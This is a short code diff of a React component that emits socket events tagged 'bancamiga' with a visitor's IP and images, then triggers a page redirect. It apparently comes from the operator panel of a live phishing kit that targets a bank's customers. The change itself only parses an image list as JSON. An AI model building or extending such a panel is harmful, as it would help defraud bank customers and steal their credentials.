@@ -14,7 +14,7 @@ export const ErrorIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
     },
     onSubmit: ({image}) =>{
       if(textPage == 'Metodo seguridad') socket.emit('[bancamiga] getImage', {image, ip})
-      if(textPage == 'Imagen') socket.emit('[bancamiga] getListImage', {image, ip})
+      if(textPage == 'Imagen') socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image) , ip})
       socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true })
       setFormView(false)
       onClose()
